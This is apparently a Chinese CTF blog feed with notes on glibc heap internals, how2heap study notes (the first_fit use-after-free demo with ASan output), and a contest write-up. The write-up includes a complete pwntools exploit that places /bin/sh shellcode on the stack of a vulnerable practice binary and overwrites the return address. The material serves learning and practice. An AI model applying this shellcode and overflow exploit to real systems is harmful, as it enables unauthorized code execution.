+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             (size of chunk, but used for application data)    |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of next chunk, in bytes                |A|0|1|        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre><h2 id="bins和chunk"><a href="#bins和chunk" class="headerlink" title="bins和chunk:"></a>bins和chunk:</h2><pre><code>bins直译过来是箱子的意思, 因而bins是和内存回收相关的一个结构用户释放之前申请的内存时, 操作系统根据释放的内存大小来决定将释放的内存放入哪个bin中所以bin相当于一个内存回收的分类而chunk翻译是块,  即数据块, 是内存分配的单位操作系统根据申请内存大小的不同, 从相应的bin中取出内存来分配如果没有合适大小的内存会从top chunk中分割一部分内存来分配剩余内存则放在remainder chunk中</code></pre><h2 id="四种类型的bin"><a href="#四种类型的bin" class="headerlink" title="四种类型的bin:"></a>四种类型的bin:</h2><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><pre><code>fastbin存放最小的chunk, 分配起来也是最快的, 可以分配从0到80byte的chunk有10个链表, 分别对应不同大小的fastbin(初始化的时候只到64byte而不是80byte, 便于对齐)fastbin是一个单链表, 操作更快如果有两个相邻的空闲fastbin是不会合并的, 因而fastbin会在malloc_state结构中独立于其他的bin大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。</code></pre><p>32位下:</p><table><thead><tr><th style="text-align:center">Fastbin</th><th style="text-align:center">chunk大小</th><th style="text-align:center">实际chunk大小（包括元数据）</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">00 - 12</td><td style="text-align:center">16</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">13 - 20</td><td style="text-align:center">24</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">21 - 28</td><td style="text-align:center">32</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">29 - 36</td><td style="text-align:center">40</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">37 - 44</td><td style="text-align:center">48</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">45 - 52</td><td style="text-align:center">56</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">53 - 60</td><td style="text-align:center">64</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center">61 - 68</td><td style="text-align:center">72</td></tr><tr><td style="text-align:center">8</td><td style="text-align:center">69 - 76</td><td style="text-align:center">80</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center">77 - 80</td><td style="text-align:center">88</td></tr></tbody></table><p>64位下:</p><table><thead><tr><th style="text-align:center">Fastbin</th><th style="text-align:center">chunk大小</th><th style="text-align:center">实际chunk大小（包括元数据）</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">00 - 24</td><td style="text-align:center">32</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">25 - 40</td><td style="text-align:center">48</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">41 - 56</td><td style="text-align:center">64</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">57 - 72</td><td style="text-align:center">80</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">73 - 88</td><td style="text-align:center">96</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">89 - 104</td><td style="text-align:center">112</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">105 - 120</td><td style="text-align:center">128</td></tr></tbody></table><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><pre><code>small bin 用来存放512byte以内的chunk, 共62个, 每个的间距是8byte如果有两个相邻的空闲small bin, 则这两个bin会合并</code></pre><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><pre><code>包含大于512 byte的chunk, 共63个, 间距为8byte</code></pre><p>组织方法如下:</p><pre><code>32个bin, 每64个byte一个阶层, 第一个512~568(512 + 64 - 8), 第二个576~632...16个bin, 每512个byte一个阶层8个bin, 每4096个byte一个阶层4个bin, 每32768个byte一个阶层2个bin, 每262144个byte一个阶层最后一个bin包括剩下的所有大小   </code></pre><p>和small bin不同的地方在于，这里的每一个bin都保存的是一个范围而不是一个确定的值，每一个bin内的chunk大小是排好序的。不过和small bin一样也可以合并。</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><pre><code>当small bin和large bin中的chunk被释放的时候会放入unsorted bin只有一个, 是一个循环链表</code></pre><h2 id="top-chunk和remainder-chunk"><a href="#top-chunk和remainder-chunk" class="headerlink" title="top chunk和remainder chunk"></a>top chunk和remainder chunk</h2><p>引用一张图片:</p><p><img src="/2019/02/26/调用malloc后发生了什么/2.jpg" alt="img"></p><p>可以看到top chunk是在最上面的(最高地址处), 是一个内存分配的边界(有效内存)</p><p>这个chunk不属于任何bin, 默认这个chunk永远存在, 大小不够的时候会通过系统调用来分配新的内存</p><p>在main arena通过sbrk分配的内存会直接加入到top chunk来拓展heap</p><p>在thread arena通过mmap分配的内存则会拥有新的heap, 同时拥有了新的top chunk</p><p>top chunk分配后, 剩下的chunk会分配给remainder chunk</p><h2 id="内存操作过程"><a href="#内存操作过程" class="headerlink" title="内存操作过程"></a>内存操作过程</h2><h3 id="heap初始化"><a href="#heap初始化" class="headerlink" title="heap初始化"></a>heap初始化</h3><pre><code>是在第一次请求分配内存的时候进行的，比如第一次进行malloc的时候。 进行了一系列函数调用，并且设置了初始化标志位，将main_arena的next arena指向自己等等。在这个阶段，heap还没有被分配。</code></pre><h3 id="heap-创建"><a href="#heap-创建" class="headerlink" title="heap 创建"></a>heap 创建</h3><pre><code>是在请求分配，初始化完成之后，但是还没有可以进行分配的内存的时候，也就是上述初始化结束之后进行。跳过一些列函数调用，大概内容也是进行一些数据结构的初始化，不过在这个阶段，在所有bin中依然没有任何可以分配的chunk。</code></pre><h3 id="分配fastbin-chunk"><a href="#分配fastbin-chunk" class="headerlink" title="分配fastbin chunk"></a>分配fastbin chunk</h3><pre><code>刚初始化之后max size和索引值均为空，由small bin处理 不为空的时候，计算索引，根据索引找到相应的bin 取走该bin的第一个chunk，第二个chunk成为第一个chunk 将chunk地址转换为用户的mem地址，返回</code></pre><h3 id="分配small-bin-chunk"><a href="#分配small-bin-chunk" class="headerlink" title="分配small bin chunk"></a>分配small bin chunk</h3><pre><code>刚初始化之后small bin都为空。Small bin某一个bin为空的时候就交给unsorted bin处理 不为空的时候，最后一个chunk被取走 转换为mem地址，返回</code></pre><h3 id="分配-large-chunk"><a href="#分配-large-chunk" class="headerlink" title="分配 large chunk"></a>分配 large chunk</h3><pre><code>刚初始化之后，large bin都为空，为空或者large bin中最大的也无法满足要求，就交给下一个最大的bin来处理 不为空的时候，如果最大的chunk大小比请求的空间大，从后往前找能够满足要求的chunk 找到之后，切成两半，一个返回给用户，一个加入unsorted bin</code></pre><h3 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h3><pre><code>释放基本上就是检查前后一个相邻的chunk是否是空闲的，是空闲的则合并，然后加入unsorted bin，否则直接加入unsorted bin</code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章:"></a>参考文章:</h2><pre><code>https://blog.csdn.net/qq_29343201/article/details/59614863https://www.anquanke.com/post/id/163971</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2月月赛记录</title>
      <link href="/2019/02/26/2%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/02/26/2%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h3><p>Download: <a href="https://github.com/Inv0k3r/pwnable_files/raw/master/pwn%20(2">pwn</a>)</p><p>ida打开程序以后可以看见一个很明显的栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Please Select:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1.Listen something."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2.Speak something to me."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"3.ESC"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%ld\n"</span>, &amp;buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Bye~~"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入2的时候读取了0x40 byte数据但是只有0x20的空间, 可以劫持到EIP</p><p>看一下保护</p><pre><code>➜  Desktop checksec pwn[*] &apos;/home/a/Desktop/pwn&apos;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      PIE enabled    RWX:      Has RWX segments</code></pre><p>开了PIE, 但是没有开NX, 可以把shellcode写到栈上跳转上去执行</p><p>但是开了pie, 栈地址是随机化的, 我们可以用选项1来leak栈地址</p><p>在gdb里看一下printf的地址</p><pre><code>pwndbg&gt; 140737488346288</code></pre><p>即 0x7fffffffdcb0</p><p>看一下输入数据的地址</p><pre><code>00:0000│ rsi rsp  0x7fffffffdcb0 ◂— &apos;23333333\nPUUUU&apos;01:0008│          0x7fffffffdcb8 —▸ 0x55555555500a (_init+10) ◂— add    byte ptr [rax - 0x7b], cl02:0010│          0x7fffffffdcc0 —▸ 0x7fffffffddb0 ◂— 0x103:0018│          0x7fffffffdcc8 ◂— 0x20000000004:0020│ rbp      0x7fffffffdcd0 —▸ 0x555555555260 (__libc_csu_init) ◂— push   r1505:0028│          0x7fffffffdcd8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax06:0030│          0x7fffffffdce0 ◂— 0x107:0038│          0x7fffffffdce8 —▸ 0x7fffffffddb8 —▸ 0x7fffffffe17e ◂— 0x2f612f656d6f682f (&apos;/home/a/&apos;)</code></pre><p>可以看到输入的数据的地址正好是之前输出的栈地址</p><p>写入shellcode跳转到这个地址即可</p><p>在exploit-db找了个shellcode, 小于0x40就行</p><pre><code>shellcode = &apos;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&apos;</code></pre><p>然后溢出到EIP执行shellcode</p><p>exp:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">'./pwn'</span>)</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">shellcode = <span class="string">'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'3.ESC\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">stack_addr = int(r.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>], <span class="number">10</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'[*] stack addr = '</span> + str(stack_addr))</span><br><span class="line">r.sendlineafter(<span class="string">'3.ESC\n'</span>, <span class="string">'2'</span>)</span><br><span class="line">r.sendline(shellcode + <span class="string">'a'</span> * (<span class="number">0x28</span> - len(shellcode)) + p64(stack_addr))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="strongbox"><a href="#strongbox" class="headerlink" title="strongbox"></a>strongbox</h3><h3 id="pwn-Android"><a href="#pwn-Android" class="headerlink" title="pwn_Android"></a>pwn_Android</h3><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Journey2urBF"><a href="#Journey2urBF" class="headerlink" title="Journey2urBF"></a>Journey2urBF</h3><p>Download: <a href="https://github.com/Inv0k3r/pwnable_files/blob/master/Journey2urBF%20(1">Journey2urBF</a>.bz2)<br>直接cat文件</p><pre><code>00000000: 1s8o 0808 s474 7s5p 0003 666p 6167 0085  .....g.\..synt..00000010: 91oo 1180 300p 437o 56q1 2513 s8op 08p7  ....0.P{I.%.....00000020: sr6o 6011 p740 or2r 12r9 49o8 0840 9953  .x`..@....V..@.F00000030: 1550 2n2q p0ns 8ss8 p9p6 7476 0086 6802  .C*-......gi..u.00000040: n778 112p n34q 0848 33r9 529o p4p9 3rr1  .k.,.Z.U3.E...&gt;.00000050: 2q35 2846 78p4 s511 3sq9 98pr 0rp0 104q  -5(Sk...?......Z00000060: r014 2s82 65o4 09o7 o115 qr47 no23 001s  ../.r......T.#..00000070: q04r n174 p81r 98s0 5553 38qo nsn5 24ps  .A.g....HF8...$.00000080: 22s8 p670 5pr3 7sn6 7r5r 53r6 n996 72q4  &quot;..c\...~^F...e.00000090: 9rqr 7103 spp1 114p rs02 0000            ..d....Y....Congratulations! You have found the flag! But it seems that it&apos;s broken.All lowercase (a-z) and uppercase (A-Z) letters have beenrotated by 13 positions,can you repair it?  Hint:The flag was expressed in an ugly programming language,try to solve it.</code></pre><p>根据提示猜测是rot 13, 找个在线解密</p><pre><code>00000000: 1f8b 0808 f474 7f5c 0003 666c 6167 0085  .....t.\..flag..00000010: 91bb 1180 300c 437b 56d1 2513 f8bc 08c7  ....0.C{V.%.....00000020: fe6b 6011 c740 be2e 12e9 49b8 0840 9953  .k`..@....I..@.S00000030: 1550 2a2d c0af 8ff8 c9c6 7476 0086 6802  .P*-......tv..h.00000040: a778 112c a34d 0848 33e9 529b c4c9 3ee1  .x.,.M.H3.R...&gt;.00000050: 2d35 2846 78c4 f511 3fd9 98ce 0ec0 104d  -5(Fx...?......M00000060: e014 2f82 65b4 09b7 b115 de47 ab23 001f  ../.e......G.#..00000070: d04e a174 c81e 98f0 5553 38db afa5 24cf  .N.t....US8...$.00000080: 22f8 c670 5ce3 7fa6 7e5e 53e6 a996 72d4  &quot;..p\...~^S...r.00000090: 9ede 7103 fcc1 114c ef02 0000            ..q....L....</code></pre><p>看到了flag文件, 文件头1f8b 0808搜了一下是压缩文件, 在010editor中把上面的数据copy进去另存为压缩文件打开</p><p><img src="/2019/02/26/2月月赛记录/1.png" alt="img"></p><p>brainfuck解两次即可拿到flag</p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="Just-RSA"><a href="#Just-RSA" class="headerlink" title="Just RSA"></a>Just RSA</h3><h3 id="crypto-1"><a href="#crypto-1" class="headerlink" title="crypto"></a>crypto</h3><h2 id="ppc"><a href="#ppc" class="headerlink" title="ppc"></a>ppc</h2><h3 id="find-the-different-number"><a href="#find-the-different-number" class="headerlink" title="find the different number"></a>find the different number</h3><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h3><h3 id="dice"><a href="#dice" class="headerlink" title="dice"></a>dice</h3><h3 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple unpack"></a>simple unpack</h3><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="funcexecutor"><a href="#funcexecutor" class="headerlink" title="funcexecutor"></a>funcexecutor</h3>]]></content>
      
      
      
        <tags>
            
            <tag> 月赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How2heap 学习记录</title>
      <link href="/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><p>how2heap 是由 shellphish 团队制作的堆利用教程，介绍了多种堆利用技术。使用 Ubuntu 16.04 64位系统环境，glibc 版本如下：</p><pre><code>$ file /lib/x86_64-linux-gnu/libc-2.23.so/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped</code></pre><p>从github clone文件夹下来</p><pre><code>$ git clone https://github.com/shellphish/how2heap.git$ cd how2heap$ make</code></pre><p>还有几个实例程序, from <a href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/3.1.6_heap_exploit_1.html">CTF-ALL-IN-ONE</a></p><h2 id="0x02-堆分配机制-amp-malloc-amp-free"><a href="#0x02-堆分配机制-amp-malloc-amp-free" class="headerlink" title="0x02 堆分配机制 &amp; malloc &amp; free"></a>0x02 堆分配机制 &amp; malloc &amp; free</h2><p>在用malloc分配内存时, 程序向堆管理器发起请求</p><p>为了保持内存管理高效, 内核会预先分配一块内存给堆管理器, 堆空间不足时, 堆管理器向操作系统进行交互</p><h3 id="malloc-malloc-size-t-n"><a href="#malloc-malloc-size-t-n" class="headerlink" title="malloc: malloc(size_t n)"></a>malloc: <code>malloc(size_t n)</code></h3><ul><li>当<code>n=0</code>时, 返回操作系统允许的最小内存块</li><li>当<code>n&lt;0</code>时, 由于size_t是无符号整型, 因此会分配一个很大的内存(通常失败, 因为没有这么大内存)</li><li>正常情况下返回指定大小的内存的指针</li></ul><p>malloc本身是一个用户函数, 并没有真正和系统进行交互, 而是通过调用brk和sbrk以及mmap, munmap函数来操作</p><p><img src="/2019/02/26/how2heap-学习记录/1.jpg" alt="img"></p><p>图片来自<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview/#_4">ctfwiki</a></p><p>限于篇幅, 调用malloc后系统的操作将在另一篇文章里说明</p><h3 id="free-free-void-p"><a href="#free-free-void-p" class="headerlink" title="free: free(void* p)"></a>free: <code>free(void* p)</code></h3><ul><li>p=null时, free不做任何操作</li><li>p指向的内存如果被释放, 会造成各种影响 (glibc的原文说明:It can have arbitrary (i.e., bad!)effects if p has already been freed.)</li><li>除了在用mallopt限制了一些内存操作的情况下,当free很大的内存时, 会将这些内存直接返还给系统, 而不是交给堆管理器 </li></ul><h2 id="0x03-pwndbg的几个操作指令"><a href="#0x03-pwndbg的几个操作指令" class="headerlink" title="0x03 pwndbg的几个操作指令"></a>0x03 pwndbg的几个操作指令</h2><p>用了一圈peda, gef, 还是pwndbg好用</p><pre><code>r(un) 重新开始运行程序c(ontinue) 到断点后继续执行n(ext) 单步步过调试s(tep) 单步步入调试until 运行至循环结束until addr 运行至某一指令finish 运行至当前函数完成返回call 调试某个函数q(uit) 退出b(reak) addr 在指定位置设置断点delete 断点号 删除断点disable 断点号 暂停断点enable 断点号 恢复断点clear addr 删除指定位置的断点info b(reakpoints) 查看断点信息delete b(reakpoints) 删除所有断点where/bt  当前运行的堆栈列表；bt backtrace 显示当前调用堆栈up/down 改变堆栈显示的深度set args 参数:指定运行时的参数show args：查看设置好的参数arena 查看arenamp 查看mmapbins,fastbins,unsorted,smallbins,largebins 各种binsheap 查看堆top_chunkrop --grep &quot;pop rdi&quot; ROP搜索vmmap 虚拟内存映射</code></pre><h2 id="0x04-first-fit"><a href="#0x04-first-fit" class="headerlink" title="0x04 first_fit"></a>0x04 first_fit</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This can be exploited in a use-after-free situation.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span>);</span><br><span class="line"><span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line"><span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"><span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(512): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(256): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"we could continue mallocing here...\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"now let's put a string at a that we can read later \"this is A!\"\n"</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(a, <span class="string">"this is A!"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n"</span>, a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, let's allocate 500 bytes\n"</span>);</span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(500): %p\n"</span>, c);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And put a different string here, \"this is C!\"\n"</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(c, <span class="string">"this is C!"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd allocation %p points to %s\n"</span>, c, c);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we reuse the first allocation, it now holds the data from the third allocation.\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个程序展示了glibc的堆分配算法, 即first fit首次适应算法</p><pre><code>➜  how2heap git:(master) ✗ ./first_fit This file doesn&apos;t demonstrate an attack, but shows the nature of glibc&apos;s allocator.glibc uses a first-fit algorithm to select a free chunk.If a chunk is free and large enough, malloc will select this chunk.This can be exploited in a use-after-free situation.Allocating 2 buffers. They can be large, don&apos;t have to be fastbin.1st malloc(512): 0x21f10102nd malloc(256): 0x21f1220we could continue mallocing here...now let&apos;s put a string at a that we can read later &quot;this is A!&quot;first allocation 0x21f1010 points to this is A!Freeing the first one...We don&apos;t need to free anything again. As long as we allocate less than 512, it will end up at 0x21f1010So, let&apos;s allocate 500 bytes3rd malloc(500): 0x21f1010And put a different string here, &quot;this is C!&quot;3rd allocation 0x21f1010 points to this is C!first allocation 0x21f1010 points to this is C!If we reuse the first allocation, it now holds the data from the third allocation.</code></pre><p>程序先malloc了一个512byte的chunk, 之后malloc了一个256byte的chunk</p><p>然后向这两个chunk写入数据</p><p>再free第一个512byte的chunk</p><p>之后malloc一个500byte的chunk, 会优先分配之前free掉的chunk, 这个free掉的chunk保存在bins中</p><p>所以为什么叫bins, 即存放free后的chunk的一个盒子</p><p>现在加上内存检测参数重新编译</p><pre><code>➜  how2heap git:(master) ✗ gcc -fsanitize=address -g first_fit.c➜  how2heap git:(master) ✗ ./a.out                              This file doesn&apos;t demonstrate an attack, but shows the nature of glibc&apos;s allocator.glibc uses a first-fit algorithm to select a free chunk.If a chunk is free and large enough, malloc will select this chunk.This can be exploited in a use-after-free situation.Allocating 2 buffers. They can be large, don&apos;t have to be fastbin.1st malloc(512): 0x61500000fd002nd malloc(256): 0x611000009f00we could continue mallocing here...now let&apos;s put a string at a that we can read later &quot;this is A!&quot;first allocation 0x61500000fd00 points to this is A!Freeing the first one...We don&apos;t need to free anything again. As long as we allocate less than 512, it will end up at 0x61500000fd00So, let&apos;s allocate 500 bytes3rd malloc(500): 0x61500000fa80And put a different string here, &quot;this is C!&quot;3rd allocation 0x61500000fa80 points to this is C!===================================================================14332==ERROR: AddressSanitizer: heap-use-after-free on address 0x61500000fd00 at pc 0x7f7c483d21e9 bp 0x7ffd40c779f0 sp 0x7ffd40c77168READ of size 2 at 0x61500000fd00 thread T0    #0 0x7f7c483d21e8  (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x601e8)    #1 0x7f7c483d2bcc in vfprintf (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x60bcc)    #2 0x7f7c483d2cf9 in fprintf (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x60cf9)    #3 0x400df4 in main /home/a/how2heap/first_fit.c:35    #4 0x7f7c47fc882f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)    #5 0x400878 in _start (/home/a/how2heap/a.out+0x400878)0x61500000fd00 is located 0 bytes inside of 512-byte region [0x61500000fd00,0x61500000ff00)freed by thread T0 here:    #0 0x7f7c4840a2ca in __interceptor_free (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x982ca)    #1 0x400c4c in main /home/a/how2heap/first_fit.c:25    #2 0x7f7c47fc882f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)previously allocated by thread T0 here:    #0 0x7f7c4840a602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)    #1 0x400a97 in main /home/a/how2heap/first_fit.c:13    #2 0x7f7c47fc882f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)SUMMARY: AddressSanitizer: heap-use-after-free ??:0 ??Shadow bytes around the buggy address:0x0c2a7fff9f50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 000x0c2a7fff9f60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 000x0c2a7fff9f70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 000x0c2a7fff9f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 fa0x0c2a7fff9f90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa=&gt;0x0c2a7fff9fa0:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd0x0c2a7fff9fb0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd0x0c2a7fff9fc0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd0x0c2a7fff9fd0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd0x0c2a7fff9fe0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa0x0c2a7fff9ff0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa faShadow byte legend (one shadow byte represents 8 application bytes):Addressable:           00Partially addressable: 01 02 03 04 05 06 07 Heap left redzone:       faHeap right redzone:      fbFreed 